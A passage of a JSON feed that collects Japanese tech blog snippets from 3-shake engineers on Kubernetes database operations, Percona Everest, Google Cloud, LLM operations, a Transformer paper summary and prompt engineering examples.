れていました。また単純なメリット・デメリット以上にユーザーの感情面にフォーカスしているところが印象的でした。Chapter 1: Enthusiasm and Kubernetes 101: Kubernetesの基本と進化この章では、Kubernetes上でデータベースを動かすための基本的なステップが段階的に示されています。Pod、Persistent Volume Claim (PVC)、Service、Secret、ConfigMap、StatefulSet、そしてHA構成のためのエージェントとProxyの導入といった流れは、Kubernetesにおけるデータベース運用の進化を理解する上で非常に有用です。特に、StatefulSetの導入は、データベースのようなステートフルアプリケーションの運用において大きな進歩です。Podの順序付けられたデプロイ、安定したネットワークID、永続ストレージへのアクセスなど、StatefulSetが提供する機能は、データベースの高可用性と安定運用に不可欠です。しかし、これらの構成要素を手作業で管理することは複雑でエラーを起こしやすいため、IaCの導入が推奨されています。IaCを用いることで、インフラストラクチャのコード化、自動化、バージョン管理が可能となり、再現性と信頼性の高いデプロイを実現できます。TerraformやAnsible、ArgoCD、HelmなどのIaCツールは、Kubernetesの構成管理を簡素化し、複数環境へのデプロイを容易にします。これは、DevOpsの原則である「Infrastructure as Code」を実践する上で非常に重要なステップです。この章では、Kubernetes上でデータベースを動かすための基本的な構成要素と、IaCの重要性が説明されています。IaCを用いることで、複雑なKubernetes環境を効率的に管理し、再現性と信頼性を向上させることができる点が強調されていました。またIaCのパラメータを変更することで複数環境をデプロイできるところからDBaaSの最初の一歩を踏み出したととらえることができました。Chapter 2: Disillusionment and Operators 101: OperatorによるDay 2 Operationの簡素化IaCによってデプロイは容易になりますが、運用、つまりDay 2 Operationは依然として複雑です。アップグレード、スケーリング、フェイルオーバー、バックアップ、モニタリング、メンテナンス、リカバリといったタスクは、手作業で行うと大きな負担となります。ここでOperatorが登場します。Operatorは、Kubernetesの拡張機能であり、特定のアプリケーションのデプロイと管理を自動化します。データベースOperatorは、データベースのライフサイクル全体を管理し、Day 2 Operationを大幅に簡素化します。Operatorの導入により、データベース管理者はKubernetesの内部構造を深く理解する必要がなくなり、データベース運用に集中できます。これは、運用コストの削減と効率性の向上に大きく貢献します。また、Operatorは宣言的な設定をサポートしており、運用作業の自動化と標準化を促進します。しかし、Operatorだけでは真のDBaaSとは言えません。セルフサービスポータル、マルチクラスタ対応、詳細なモニタリング、課金機能など、DBaaSに必要な機能は多岐に渡ります。この章では、OperatorがDay 2 Operationを簡素化する上で重要な役割を果たすことが説明されています。Operatorは、データベース管理者の負担を軽減し、運用効率を向上させる強力なツールです。これはデータベースエンジニアといわれるロールが採用市場に少ない日本では特に重要な点です。大規模なデータベース運用に合わせてデータベースエンジニアの採用を増やすことは難しいため、様々なツールを利用して負荷を下げ、省力化し、より本質的な業務を行う必要があるためです。一方でOperatorだけではDBaaSの全てをカバーできない点にも注意が必要です。Chapter 3: Hope and DBaaS: Percona Everestの紹介Percona Everestは、オープンソースのDBaaSソリューションであり、Kubernetes上でデータベースサービスを提供します。ReactとMaterial UIで構築された直感的なUI、Golangで実装されたバックエンド、そしてAPIによるアクセスを提供することで、ユーザーフレンドリーな操作性を実現しています。Everestのアーキテクチャは、複数のOperatorをOperator Managerで管理する構造を採用しています。これにより、Operatorのバージョン管理、依存関係の解決、相互運用性の確保が容易になります。ユーザーは、GUIまたはAPIを介してデータベースサービスを操作し、そのリクエストはEverest Operatorによって各データベースOperatorに変換されます。Everestは、オープンソースDBaaSとして、ベンダーロックインを回避し、柔軟なデータベース運用を可能にします。また、コミュニティベースの開発により、迅速な機能追加とバグ修正が期待できます。この章では、Percona EverestがオープンソースDBaaSとして、Kubernetes上でデータベースサービスを提供する仕組みが説明されています。Everestは、ユーザーフレンドリーなUI、Operator ManagerによるOperator管理、そしてオープンソースとしてのメリットを提供することで、柔軟で効率的なデータベース運用を支援します。セッション中ではGUIやAPIは利用しない導入例もあると話されており、個人的にはKubernetesリソースの管理に余計なUIを追加する方法は大規模化したときにデメリットが増えるのではないかと感じました。またこのセッションのスピーカーはPerconaのエンジニアであるためある程度ポジショントークが含まれているであろうことも注意が必要です。Epilogue: Kubernetesとデータベースの未来セッションの締めくくりとして、Kubernetes上でのデータベース運用は困難な側面もあるものの、OperatorやDBaaSソリューションの活用により、効率的でスケーラブルな運用が可能になることが強調されています。Kubernetes上でデータベースを運用することは、もはや一部の先進的な企業だけの選択肢ではなく、一般的な選択肢になりつつあります。クラウドネイティブな環境でデータベースを運用することは、ビジネスの俊敏性と競争力を高める上で重要な要素となります。Kubernetes上でのデータベース運用に対する不安や懸念を解消し、その可能性を示す上で非常に有益な内容でした。Percona EverestのようなオープンソースDBaaSソリューションの登場は、Kubernetesにおけるデータベース運用の楽にする選択肢の一つと言えるでしょう。まとめこのセッションを通して、Kubernetes上でのデータベース運用は、進化を続け、成熟しつつあることが理解できました。初期の懸念は解消されつつあり、OperatorやDBaaSソリューションの登場により、運用効率とスケーラビリティが大幅に向上しています。特に定型的なデプロイと運用を自動化できることでデータベースエンジニアはアプリケーション特性に応じた最適化やリリースマネジメントといったユーザーに価値を提供することを最大化することに注力することができます。今後、Kubernetes上でのデータベース運用はさらに普及し、クラウドネイティブなアプリケーション開発の中核を担うことになるでしょう。一定以上の規模の組織ではオンプレ回帰やクラウドコストの最小化といった観点からKubernetes上にデータベースをホストするソリューションが求められ生ます。そのためデータベースエンジニアは、Kubernetesの基礎知識を習得し、OperatorやDBaaSソリューションの活用方法を学ぶことで、より効率的で本質的な業務を遂行できるようになるはずです。","isoDate":"2024-12-08T02:42:58.000Z","dateMiliSeconds":1733625778000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"バッチ処理をCloud RunからCloud Run jobsに変更してみた話","link":"https://qiita.com/bayobayo0324/items/71f7e19a051261d1adfc","contentSnippet":"この記事は3-shake Advent Calendar 2024 シリーズ1の8日目の記事ですはじめましてあるいはこんにちは、@bayobayo0324 です。株式会社スリーシェイクでクラウド型ETLツール「Reckoner（レコナー）」のプロダクトエンジニアしていま...","isoDate":"2024-12-07T22:06:20.000Z","dateMiliSeconds":1733609180000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"私とJagu\'e\'rと2025年から...","link":"https://blog.masasuzu.net/entry/2024/12/08/000000","contentSnippet":"この記事はJagu\'e\'r Advent Calendar 2024の8日目の記事です。日付的には大遅刻です。特に技術的な話はしません。思い出話とこれからの意気込みを書きます。Jagu\'e\'r(Japan Google Cloud Usergroup for Enterprise) は、Google Cloudのユーザー企業やパートナー企業が集まるユーザー会です。私はパートナー企業であるスリーシェイクに所属し、Jagu\'e\'rに参加しています。実は入会自体は結構前で、メールを遡ると2023年8月10日でした。当時Google Cloudに関わる案件が始まり、情報収集のために登録した記憶があります。しかし、「Enterprise」や「分科会」といった言葉から、何となく堅苦しいイメージを抱いてしまい、Slackには入ったものの、あまり活動には参加していませんでした。転機が訪れたのは、今年2024年の春から夏頃のこと。同僚が分科会の運営に入り、別の同僚もJagu\'e\'rのMeetupで発表するようになったんです。身近な人が関わるようになると、自然と興味が湧いてきて、今年の後半はオンライン・オフライン問わず、Meetupに参加するようになりました。そして先日、Jagu\'e\'r Park \'24 Winter!に参加しました。そこで行われたJagu\'e\'r Award選出のためのピッチ発表に、私は深く感銘を受けました。どの発表者の方も、Jagu\'e\'rコミュニティへの熱い思いや感謝の気持ちが溢れていて、本当に心を動かされました。特に、中外製薬の方とDatadogの方のピッチは強く印象に残っています。これまでJagu\'e\'rコミュニティに深く関わってきませんでしたが、こんなにも熱い思いを持つ人たちと一緒に活動したい！という気持ちが湧き上がってきました。「善は急げ」と、ピッチを聞いたその場で、社内でJagu\'e\'rの分科会運営に携わっている人に連絡を取り、運営を手伝えないか相談しました。さらに懇親会では、弊社担当のGoogle Cloudパートナーエンジニアの方にも相談し、同じ分科会の運営の方につなげてもらいました。問題がなければ、来年から某分科会の運営に携わる予定です。正直なところ、勢いで走り出した部分もあるので、まだ何ができるか、何をしていきたいかは漠然としています。それでも、来年はコミュニティの活性化に貢献できるような成果を残せるよう、精一杯頑張りたいと思っています。","isoDate":"2024-12-07T15:00:00.000Z","dateMiliSeconds":1733583600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Lima+containerd+nerdctlで作るコンテナ環境/lima_containerd_nerdctl","link":"https://speakerdeck.com/moz_sec_/lima-containerd-nerdctl-1","contentSnippet":"","isoDate":"2024-12-07T05:00:00.000Z","dateMiliSeconds":1733547600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"セキュアな LLM アプリ開発：OWASP Top 10 for LLM 2025 と Vertex AI による実践","link":"https://zenn.dev/kimitsu/articles/owasp-for-llm-2025-and-vertex-ai","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 7 日目の記事です。 はじめにOWASP Top 10 for LLM Applications の 2025 年版が 11 月 18 日に発表されました。[1]OWASP Top 10 は Web アプリケーションのセキュリティリスクの中で最も重要な 10 個をリスト化したものであり、OWASP Top 10 for LLM Applications は名前の通り LLM を利用したアプリケーションに関するものです。本家は数年に一度の改訂ですが、こちらは LLM の技術進歩が早いためほぼ毎年...","isoDate":"2024-12-07T00:14:53.000Z","dateMiliSeconds":1733530493000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"CUDAを利用したプログラムの高速化とNvidia Container Toolkit","link":"https://sreake.com/blog/cuda-nvidia-container-toolkit/","contentSnippet":"はじめに Sreake事業部インターン生の高島陸斗です。インターン生としてSRE技術の調査・検証を行っています。私は、情報系の大学院生で、普段は数値解析に関する研究をしています。学部時代は、今回のブログ内容とも関係する並 […]The post CUDAを利用したプログラムの高速化とNvidia Container Toolkit first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-06T01:51:20.000Z","dateMiliSeconds":1733449880000,"authorName":"Sreake","authorId":"Sreake"},{"title":"argocd コマンドで別ブランチとの差分を確認する","link":"https://qiita.com/yteraoka/items/aea03d50288375f85183","contentSnippet":"ArgoCD の GitOps で Merge 前に manifest の差分を見たいArgoCD は Application リソースで source に指定した Git などの定義と実際に Kubernetes クラスタにデプロイされている manifest の差分...","isoDate":"2024-12-03T15:14:17.000Z","dateMiliSeconds":1733238857000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"LLMのモデル更新や廃止による影響を考える","link":"https://shu-kob.hateblo.jp/entry/2024/12/03/232856","contentSnippet":"この記事は、MLOps（LLMOps、生成AIOps） Advent Calendar 2024 4日目の記事です。生成AIの普及により、アプリケーションに組み込んで実運用を始めた方も増えてきたと思います。LLMOpsをする中で気をつけたいことを考えてみました。モデルの更新まず、思い浮かぶのがモデルの更新よる影響です。モデルの更新によって性能が上がるなどのメリットを享受できる反面、挙動変更によって、困ることもあります。私の場合、システムの実運用では無いですが、LLM技術書のサンプルコードが動かなくなる事態がありました。06_agent/agent_5.py で2回目の実行結果が正しく表示されません \xb7 Issue #3 \xb7 harukaxq/langchain-book \xb7 GitHubgpt-3.5-turboをAgentとして使用したときの挙動が変わったという内容です。アプリに組み込んでいたら、機能が使えなくなる可能性があり、使えなくなった場合の代替案も用意しておく必要があると考えました。また、LLMのリリース情報もウォッチしておく必要があるでしょう。Geminiはリリースの最新情報を日本語で提供しています。gemini.google.comChatGPTはリリースノートを英語のみですが提供しています。ChatGPT — Release Notes | OpenAI Help CenterAnthropic製品（Claude）のリリースノートは日本語で提供されています。docs.anthropic.comモデルの廃止モデルの廃止もウォッチする必要があるでしょう。GPT-3.5 Turbo終了はニュースになりました。xtech.nikkei.com↑日経クロステックの有料会員記事ですが、会員でなくても1ページ目で内容は把握できます。learn.microsoft.comAzure OpenAIでは、GPTの各種マイナーバージョンが提供されていますが、適宜廃止になるので注意が必要です。廃止になる場合、モデルのVersion UPが必要なので、早めに開発環境でVersion UPしたモデルの挙動確認をする必要があるでしょう。Version UPしたモデルだと、LLMの利用料が高くなることも念頭に置いて、コスト試算しましょう。まとめモデル更新や廃止を早く知るために、LLM公式サイトのリリースノートなどのウォッチをして、早めに対策をしましょう。","isoDate":"2024-12-03T14:28:56.000Z","dateMiliSeconds":1733236136000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Transformer論文を生成AIで要約してみた","link":"https://shu-kob.hateblo.jp/entry/2024/12/02/233507","contentSnippet":"この記事は生成AI Advent Calendar 2024の3日目の記事です。AIの歴史は60年ほどで、「冬の時代」と呼ばれる停滞期もありましたが、昨今の生成AIの発展は「Transformer」と呼ばれる論文から始まりました。この「Transformer」論文をわかりやすいように生成AIに要約させてみました。arxiv.org「Transformer」論文は上記サイトで見ることができます。論文の正式名称は「Attention Is All You Need」で、現在 v7。右側のAccess Paper:から閲覧することができます。なお、PDFの直リンクはこちらGoogle CloudのVertex AIでGeminiに要約させた結果は以下です。プロンプト「この論文を日本語で高校3年生レベルにもわかるように要約してください。」この論文は、「Transformer」という、機械翻訳などのシーケンス変換タスクに革新をもたらした新しいニューラルネットワークアーキテクチャを提案しています。高校3年生にもわかるように要約すると、以下のようになります。従来の機械翻訳の問題点:従来の機械翻訳は、RNN（再帰型ニューラルネットワーク）という技術を主に使っていました。RNNは文章を単語ごとに順番に処理していくため、長い文章だと処理に時間がかかります。また、並列処理が難しいため、計算速度を上げるのが困難でした。Transformerの革新的な点:Transformerは、「Attention（注意機構）」という仕組みに完全に基づいており、RNNのような順番に処理する仕組みを完全に排除しました。Attention機構は、翻訳したい単語を生成する際に、入力文全体の中でどの単語に注目すべきかを判断する仕組みです。人間の翻訳作業で例えると、翻訳する際に原文の関連する部分に注目するのと同じような働きをします。この仕組みにより、以下の利点が生まれました。並列処理が可能: 単語を順番に処理する必要がないため、並列処理が可能になり、計算速度が大幅に向上しました。長い文章への対応力向上: RNNでは、文章が長くなるほど精度が落ちやすいという問題がありましたが、Attention機構は入力文全体を一度に見ることができるため、長い文章でも高い精度を維持できます。Transformerの成果:Transformerは、従来のモデルよりも高い精度を達成し、さらに学習時間も大幅に短縮しました。具体的には、英語からドイツ語への翻訳と英語からフランス語への翻訳タスクで、当時の最高精度を更新しました。Transformerの仕組みを簡単に説明すると:Transformerは、エンコーダとデコーダという2つの部分から構成されています。エンコーダ: 入力文を解析し、各単語の意味をベクトル表現に変換します。デコーダ: エンコーダの出力とAttention機構を利用して、翻訳文を生成します。エンコーダとデコーダは、それぞれ複数の層が積み重なった構造になっています。各層は、Attention機構と全結合層という2つのサブ層から構成されています。Transformerの今後の展望:Transformerは、テキスト以外のデータ（画像、音声、動画など）にも応用できる可能性があり、様々な分野での活用が期待されています。また、文章生成をより効率的に行うための研究も進められています。簡単に言うと、Transformerは、人間の「注意」の仕組みに似た仕組みを使って、従来よりも高速で高精度な機械翻訳を実現した画期的な技術です。","isoDate":"2024-12-02T14:35:07.000Z","dateMiliSeconds":1733150107000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年の崖から考える我々のパーパス（序章）","link":"https://shu-kob.hateblo.jp/entry/2024/12/01/232229","contentSnippet":"はじめにこの記事は3-shake Advent Calendar 2024 シリーズ1の2日目の記事です。1日目はシリーズ1がYutaro ShirayamaさんのポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する2日目はシリーズ2がYoshinori Teraokaさんのvector で kubernetes の container log を CloudWatch Logs に転送するでした。なお、シリーズ2の2日目はshingo919さんの 九州旅行記（ドライブでの九州一週旅行は大変だった！）です。2025年の崖今回は「2025年の崖」について軽くご紹介したいと思います。いよいよ2025年になりますが、ITでは「2025年の崖」という言葉が存在します。2025年の崖がある中で、スリーシェイクのSreake事業部が果たす役割を考えていきたいと思います。「2025年の崖」をググったら色々出てきますが、経済産業省のレポートが1次情報源的かつわかりやすいでしょう。www.meti.go.jpなお、DXレポート ～ITシステム「2025年の崖」の克服とDXの本格的な展開～（サマリー）はスライド5枚にまとまっており、さっと読みやすいです。「2025年の崖」は要するに何なのかというと、IT人材が不足しており、レガシーシステムを保守するのに限界が来ている。DXも推進しないといけない。何とかしないともう後が無い。という状況。2015年時点で、IT人材の不足が約17万人とされていたところ、2025年には約43万人にまで上ります。既存のレガシーシステムの保守がブラックボックス、属人的になっており、DX化の足枷に → デジタル競争の敗者に技術的負債が溜まる一方保守運用の担い手不足で、サイバーセキュリティ事故が起きやすくこんな厳しい状況を打破するには、ユーザとベンダーそれぞれで対策していく必要があります。ユーザは人材・資金を保守からDXにシフトベンダーも同様に人材・資金を保守からDXにシフトベンダーはAI、アジャイル、マイクロサービス等最新技術を用いたビジネスにシフトやることはわかっていても、そう簡単にはいきません。ただし、スリーシェイクのSreake事業では、内製化支援も行っており、これまで数々の企業様の支援を行ってまいりました。Sreakeという商材は難しく、入社して1年が経った私もストンと腹落ちできる説明ができないままでしたが、「2025年の崖」をどう克服するかが我々のパーパスだと感じました。私は生成AIアプリケーション開発支援というDXを担当しておりますが、案件の推進を通して、「DX推進」を語れるようになっていきたいと思います。今回は、序章のような形で今後も2025年の崖について書いていければと思います。次の3-shake Advent Calendar 2024はシリーズ1がkechigonさんの「Google Cloud monitoringのアラートをGitHub issueに通知する」シリーズ2がtryu___さんの「kubebuilder使ってpodの監視してみた」です。","isoDate":"2024-12-01T14:22:29.000Z","dateMiliSeconds":1733062949000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"vector で kubernetes の container log を CloudWatch Logs に転送する","link":"https://qiita.com/yteraoka/items/df0777cdcb403a7af750","contentSnippet":"Vector とはvector は timber とともに買収され datadog がメンテナンスしているオープンソースプロジェクトのようです。(Datadog acquires Timber Technologies)A lightweight, ultra-fas...","isoDate":"2024-12-01T12:20:46.000Z","dateMiliSeconds":1733055646000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Geminiのビジネス利用でのメリットを語る","link":"https://shu-kob.hateblo.jp/entry/2024/11/30/233039","contentSnippet":"この記事はGCP(Google Cloud Platform) Advent Calendar 2024 1日目の記事です。2024年はIT業界にとって、最も話題に上がったトピックは生成AIだったのではないでしょうか？2023年までは生成AIと家は、ChatGPTでしたが、2024年はGoogleがBardをリブランディングして、Gemini（ジェミニ）とし、しのぎを削っています。私はGoogle Cloudのパートナー企業である株式会社スリーシェイク Sreake事業部にて、Geminiを用いた生成AIアプリケーション開発に携わっており、Geminiのビジネス利用でのメリットを語りたいと思います。Gemini-1.5-Proは最大200万トークンの読み込みが可能Geminiの強みの中で、最も他の生成AIモデルと差別化できているのが、トークン数の長さです。これにより、動画解析などへの利用もしやすくなりました。Geminiはマルチモーダルなので、音声、画像、動画なども処理可能です。量の目安としては以下になります。書籍15〜20冊程度の分量動画約2時間音声約22時間BigQueryで容易にデータ分析基盤を構築可能他のクラウドには同様のサービスがなく、同じ機能を実現するためには複数のサービスを組み合わせる必要があります。AzureやAWS、オンプレのデータはそのままで読み込みだけ行う機能もあります。今お使いのシステム構成はほぼ変えず、追加構築可能となります。Geminiは他のモデルと比較してトークンあたりの利用料が安いGoogle Cloud上で稼働させるのに最適化しているためです。他社のクラウドで使える生成AIモデルは別会社のものなので、クラウドも生成AIもGoogleのGeminiによって、この点も強みです！もしもGeminiの出力結果が著作権侵害で係争が発生してもGoogle Cloudがサポート他クラウドにはないサービスです。こちらも、クラウドも生成AIも会社が揃っている強みと言えるでしょう。真実性1位！Gemini 1.5 ProがNIKKEI Digital Governanceが調査した真実性のスコアで1位となりました！以下の記事は最初日経で見れていたと思うのですが、今はNIKKEI Digital Governanceに登録しないと見れないようです。博識のGoogle､主観強いMeta　生成AIの｢真実性｣を検証上記画像は下記記事から引用させていただきました。note.com2024年もあと少し。2025年もGeminiとともに生成AIを盛り上げていきたいと思います！GCP(Google Cloud Platform) Advent Calendar 2024 次の記事はknak72さんによる企業のセキュリティ強化に！ Chrome Enterprise Premium のURLフィルタリングとマルウェアスキャン機能です。","isoDate":"2024-11-30T14:30:39.000Z","dateMiliSeconds":1732977039000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"3-shake における組織的な Google Cloud Partner Top Engineer 推進について","link":"https://sreake.com/blog/google-cloud-partner-top-engineer-2025/","contentSnippet":"はじめに 3-shakeで、Engineering Team Lead / SRE をやっている横尾（@866mfs）です 今回、3-shake では、佐藤 慧太(@SatohJohn), 横尾 杏之介(@866mfs) […]The post 3-shake における組織的な Google Cloud Partner Top Engineer 推進について first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:00:00.000Z","dateMiliSeconds":1732773600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"コミュニティ紹介: Kubernetes Meetup Novice","link":"https://speakerdeck.com/bells17/komiyuniteishao-jie-kubernetes-meetup-novice","contentSnippet":"Cloud Native Days Winter 2024のCommunity & Beginner LTでお話した資料です。\\r\\rhttps://pfem.notion.site/CNDW2024-Community-Beginner-LT-13821b0141e0800cb403c880cb4d2738","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"bells17","authorId":"bells17"},{"title":"メインテーマはKubernetes","link":"https://speakerdeck.com/nwiizo/meintemahakubernetes","contentSnippet":"2024年16:20-17:00（Track A）にて「メインテーマはKubernetes」というタイトルで登壇します。\\r\\rイベント名: Cloud Native Days Winter 2024\\r\\r公式URL:https://event.cloudnativedays.jp/cndw2024/\\r\\rセッションURL:https://event.cloudnativedays.jp/cndw2024/talks/2373","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"KubeCon + Cloud NativeCon North America 参加レポート","link":"https://sreake.com/blog/kubecon-cloud-nativecon-north-america-2024-report/","contentSnippet":"はじめに こんにちは！3-shak inc, で SRE をやっている横尾(@866mfs)です。 2024/11/12 ~ 2024/11/15 に開催された、\xa0KubeCon + CloudNativeCo […]The post KubeCon + Cloud NativeCon North America 参加レポート first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-27T00:28:01.000Z","dateMiliSeconds":1732667281000,"authorName":"Sreake","authorId":"Sreake"},{"title":"社内活動の取り組み紹介~ スリーシェイクでこんな取り組みしてます ~","link":"https://speakerdeck.com/bells17/she-nei-huo-dong-noqu-rizu-mishao-jie-surisieikudekonnaqu-rizu-misitemasu","contentSnippet":"CloudNative Days Winter 2024 船上LT会 小さな一歩、大きな飛躍〜クラウドネイティブを継続する〜 で発表したLT資料です。\\rhttps://cloudnativedays.connpass.com/event/334620/","isoDate":"2024-11-26T05:00:00.000Z","dateMiliSeconds":1732597200000,"authorName":"bells17","authorId":"bells17"},{"title":"[S3 Intelligent-Tiering]概要とTerraformでの実装","link":"https://zenn.dev/takehiro1111/articles/s3_intelligent_tiering","contentSnippet":"0.本記事を書いている経緯業務でS3周りのコスト削減の一環としてS3 Intelligent-Tierringの設定を行う予定だが、その前段階で導入に必要なコストや懸念点を調査している。その過程で自身の備忘録として残しています。 1.概要(参照) 1-1.設定する目的S3に関連するコスト削減を行いたいため。どのオブジェクトがどの程度使用されるか判断がつかない状態で、安易にライフサイクルポリシーでGracierへ移行したり出来ないため、AWS側でアクセスパターンを検知し、オブジェクトを最適な階層へ移行してくれる。 1-2.機能Amazon S3 のストレ...","isoDate":"2024-11-24T07:24:48.000Z","dateMiliSeconds":1732433088000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Reckoner における Datadog Browser Test の活用事例 / Datadog Browser Test at Reckoner","link":"https://speakerdeck.com/nomadblacky/datadog-browser-test-at-reckoner","contentSnippet":"Japan Datadog User Group Meetup#6\\rhttps://datadog-jp.connpass.com/event/334594/","isoDate":"2024-11-20T05:00:00.000Z","dateMiliSeconds":1732078800000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"プロンプトエンジニアリングハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/11/19/172452","contentSnippet":"genai-users.connpass.com↑上記勉強会の資料です。shu-kob.hateblo.jp↑こちらの記事の「プロンプトエンジニアリング」もご覧ください。（上記記事はChatGPT）先ずは復習してみましょうGeminiにアクセスgemini.google.comお好みで、ChatGPTやClaudeを使用しても構いません。プロンプトエンジニアリングJSON形式で出力カレーのレシピを教えてください。出力は以下のJSON形式にしてください。==============={  \\"材料\\": [\\"材料1\\", \\"材料2\\"],  \\"手順\\": [\\"手順1\\", \\"手順2\\"]}==============={  \\"材料\\": [    \\"玉ねぎ 1個\\",    \\"にんじん 1本\\",    \\"じゃがいも 2個\\",    \\"牛肉 300g\\",    \\"カレールー 2箱\\",    \\"サラダ油 大さじ2\\",    \\"水 800ml\\",    \\"塩 少々\\",    \\"こしょう 少々\\"  ],  \\"手順\\": [    \\"玉ねぎ、にんじん、じゃがいもは食べやすい大きさに切る。\\",    \\"鍋にサラダ油を熱し、牛肉を炒め、色が変わったら玉ねぎを加えて炒める。\\",    \\"にんじん、じゃがいもを加えてさらに炒める。\\",    \\"水を加え、アクを取りながら煮込む。\\",    \\"野菜が柔らかくなったらカレールーを加えて溶かす。\\",    \\"塩こしょうで味を調え、5分ほど煮込む。\\"  ]}出力結果をJSON Formatterで確認JSON Formatter & ValidatorZero-shotプロンプティングZero-Shotプロンプティングとは、大規模言語モデル（LLM）に対して、事前に具体的な例を示すことなく、一度の指示でタスクを実行させるプロンプトエンジニアリング手法です。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開芸能Few-shotプロンプティングFew-Shotプロンプティングは、大規模言語モデル（LLM）に対して、タスクを実行するための具体的な例をいくつか示すことで、モデルの性能を向上させるプロンプトエンジニアリングの手法です。Zero-Shotプロンプティングとの違いZero-Shotプロンプティングが、一切の例を示さずにタスクを実行させるのに対し、Few-Shotプロンプティングでは、少数の例を提示することで、モデルがより効率的にタスクを学習できるようにします。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」：政治「岡田将生&高畑充希結婚 SNS反応」：芸能芸能Zero-shot Chain-of-ThoughtプロンプティングZero-shot Chain-of-Thought（CoT）プロンプティングは、大規模言語モデル（LLM）に対して、具体的な例を示すことなく、段階的な推論プロセスを踏ませるように指示するプロンプトエンジニアリングの手法です。回答だけ一言で出力してください。10 + 2 * 3 - 4 * 28ステップバイステップで考えてください。10 + 2 * 3 - 4 * 2## ステップバイステップで解いてみましょう！**与えられた式:** 10 + 2 * 3 - 4 * 2**解き方:**数学では、**掛け算と割り算**は、**足し算と引き算**よりも先に計算します。これを**優先順位**と言います。1.  **掛け算を計算する:**    * 2 * 3 = 6    * 4 * 2 = 8    式は、10 + 6 - 8 に変わります。2.  **残りの計算を行う:**    * 10 + 6 = 16    * 16 - 8 = 8**答え:** 8**まとめ:**与えられた式をステップバイステップで解くと、答えは**8**になります。**ポイント:*** **優先順位:** 掛け算と割り算は、足し算と引き算よりも先に計算します。* **計算順序:** 左から右へ計算していきます。**補足:**もし、計算の順番を変えたい場合は、**かっこ**を使います。例えば、(10 + 2) * 3 - 4 * 2 のようにかっこでくくると、最初に10と2を足してから3をかけることになります。**この説明で理解できましたか？** もし、まだ疑問な点があれば、遠慮なく質問してくださいね。Few-shot Chain-of-ThoughtプロンプティングFew-shot CoTプロンプティングは、大規模言語モデル（LLM）に、いくつかの例を示しながら、段階的な推論プロセスを踏ませることで、より複雑な問題を解かせる手法です。このグループの奇数を合計すると偶数になります。: 4、8、9、15、12、2、1。A: 奇数を全て加えると(9, 15, 1)25になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 17、10、19、4、8、12、24。A: 奇数を全て加えると(17, 19)36になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 16、11、14、4、8、13、24。A: 奇数を全て加えると(11, 13)24になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 17、9、10、12、13、4、2。A: 奇数を全て加えると(17, 9, 13)39になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 15、32、5、13、82、7、1。A:参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門10倍速で成果が出る！ChatGPTスゴ技大全","isoDate":"2024-11-19T08:24:52.000Z","dateMiliSeconds":1732004692000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"PostgreSQLので全文検索拡張機能、pg_bigmを試す","link":"https://zenn.dev/nnaka2992/articles/use_pgbigm_on_cloudsql","contentSnippet":"アプリケーションを開発しているとアプリケーションログの分析や、JSONデータに対する分析など全文検索機能を求められることがたびたびあります。そういった場合はElasticsearchのように全文検索に特化したデータベースを導入することが多いです。しかし単純な文章の検索[^特にトランザクション用途]や小規模に利用される場合ばわざわざ専用のデータベースを管理作りたくないというケースが多いです。今回はPostgreSQLで利用可能な全文検索インデックスの拡張機能であるpg_bigmを紹介します。 検証環境の作成 CloudSQL 構成Cloud SQL EditionsE...","isoDate":"2024-11-16T11:12:07.000Z","dateMiliSeconds":1731755527000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes Sidecar 一問一答","link":"https://sreake.com/blog/kubernetes-native-sidecar/","contentSnippet":"はじめに Kubernetes 1.29からBeta機能となったSidecar Containerという機能を使う機会があったので、これについて一問一答形式で概要を共有してみようと思います。 小粒なTipsになりますがご […]The post Kubernetes Sidecar 一問一答 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:06:41.000Z","dateMiliSeconds":1731038801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"データベースリライアビリティエンジニアリング輪読会","link":"https://sreake.com/blog/database-reliability-engineering-reading-circle/","contentSnippet":"はじめに こんにちは。株式会社スリーシェイク Sreake 事業部に所属している @Sugo Fumitaka です。Sreake 事業部は技術力が求められる領域で豊富な経験を持つ SRE の専門家が集まったチームです。 […]The post データベースリライアビリティエンジニアリング輪読会 first appeared on sreake.com | 